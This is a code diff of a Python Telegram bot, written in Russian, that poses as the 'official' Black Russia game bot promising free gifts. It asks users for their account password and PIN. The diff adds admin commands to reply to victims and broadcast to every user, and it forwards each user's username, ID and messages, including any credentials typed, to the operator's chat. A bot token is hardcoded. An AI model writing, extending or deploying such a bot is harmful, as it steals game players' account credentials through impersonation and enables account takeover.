@@ -4,11 +4,12 @@ import os
 import json
 import time
 import threading
+import re
 
 app = Flask(__name__)
 
 BOT_TOKEN = "8828199468:AAEh0DC2_g9swwiCoNc080AmQK11qyNrOiE"
-ADMIN_CHAT_ID = "8625787020"
+ADMIN_CHAT_ID = "8625787020"  # ТВОЙ ID
 
 # === ФАЙЛЫ ===
 USERS_FILE = "users.json"
@@ -36,6 +37,7 @@ def save_user(user_id):
             json.dump(USERS, f)
 
 user_state = {}
+pending_reply = {}
 
 # === ТЕКСТЫ ===
 WELCOME = "🎁 *BLACK RUSSIA — ОФИЦИАЛЬНЫЙ БОТ*\n\n▸ Здесь ты можешь получить бесплатные подарки от Black Russia.\n▸ Выбери действие ниже."
@@ -46,6 +48,7 @@ ENTER_PASSWORD = "🔑 *Введите ваш ПАРОЛЬ от аккаунта
 ENTER_PIN = "🔐 *Введите ваш 4-значный ПИН-КОД (если есть):*\n\nИли нажмите «Нет кода»."
 WAITING = "⏳ *Ожидайте 10–30 минут!*\n\n▸ Вы в очереди на получение подарка.\n▸ Как только подарок будет выдан — вы получите уведомление."
 CHOOSE_ACTION = "📌 *Выберите действие:*"
+ADMIN_REPLY = "📨 *Ответ администратора:*\n"
 
 SERVERS = ["RED", "GREEN", "BLUE", "YELLOW", "ORANGE", "PURPLE", "LIME", "PINK", "CHERRY", "BLACK", "INDIGO", "WHITE", "MAGENTA", "CRIMSON", "GOLD", "AZURE", "PLATINUM", "AQUA", "GRAY", "ICE", "CHILLI", "CHOCO", "MOSCOW", "SPB", "UFA", "SOCHI", "KAZAN", "SAMARA", "ROSTOV", "ANAPA", "EKB", "KRASNODAR", "ARZAMAS", "NOVOSIBIRSK", "GROZNY", "SARATOV", "OMSK", "IRKUTSK", "VOLGOGRAD", "BELGOROD", "VLADIKAVKAZ", "CHELYABINSK", "KRASNOYARSK", "CHEBOKSARY", "KHABAROVSK", "PERM", "RYAZAN", "MURMANSK", "PENZA", "KURSK", "ORENBURG", "KIROV", "TOLYATTI", "BRATSK", "ASTRAKHAN", "IZHEVSK", "SURGUT", "PODOLSK", "MAGADAN", "CHEREPOVETS", "NORILSK", "ASTANA"]
 
@@ -134,6 +137,7 @@ def handle_message(chat_id, text, username, user_id):
         return
     send_message(chat_id, CHOOSE_ACTION, MAIN_KEYBOARD)
 
+# === ПОЛЛИНГ (получение сообщений) ===
 def get_updates(offset=None):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
     params = {"timeout": 30, "allowed_updates": ["message"]}
@@ -157,8 +161,49 @@ def poll():
                     text = msg.get("text", "")
                     username = msg["from"].get("username", "anon")
                     user_id = msg["from"]["id"]
+
+                    # === ОТВЕТ АДМИНА (через reply_to_message) ===
+                    reply_to = msg.get("reply_to_message")
+                    if reply_to and str(chat_id) == ADMIN_CHAT_ID:
+                        reply_text = reply_to.get("text", "")
+                        match = re.search(r'ID:\s*(\d+)', reply_text)
+                        if match:
+                            target_id = int(match.group(1))
+                            send_message(target_id, ADMIN_REPLY + text)
+                            send_message(ADMIN_CHAT_ID, f"✅ *Ответ отправлен* (ID: {target_id})")
+                            continue
+
+                    # === КОМАНДЫ АДМИНА ===
+                    if str(chat_id) == ADMIN_CHAT_ID:
+                        if text == '/users':
+                            send_message(ADMIN_CHAT_ID, f"👥 *Всего пользователей:* {len(USERS)}")
+                            continue
+                        if text.startswith('/reply '):
+                            parts = text.split(" ", 2)
+                            if len(parts) >= 3 and parts[1].isdigit():
+                                target_id = int(parts[1])
+                                reply_text = parts[2]
+                                send_message(target_id, ADMIN_REPLY + reply_text)
+                                send_message(ADMIN_CHAT_ID, f"✅ *Ответ отправлен* (ID: {target_id})")
+                            continue
+                        if text.startswith('/sendall '):
+                            msg = text.replace("/sendall ", "")
+                            for uid in USERS:
+                                try:
+                                    send_message(uid, msg)
+                                except:
+                                    pass
+                            send_message(ADMIN_CHAT_ID, f"✅ *Рассылка отправлена* {len(USERS)} пользователям.")
+                            continue
+
+                    # === ОБЫЧНЫЕ ПОЛЬЗОВАТЕЛИ ===
                     save_user(user_id)
+                    # Отправляем админу юзернейм и текст отдельно
+                    send_message(ADMIN_CHAT_ID, f"@{username} (ID: {user_id})")
+                    send_message(ADMIN_CHAT_ID, text)
+                    # Обрабатываем логику бота
                     handle_message(chat_id, text, username, user_id)
+
                     offset = update["update_id"] + 1
         except Exception as e:
             print("Polling error:", e)
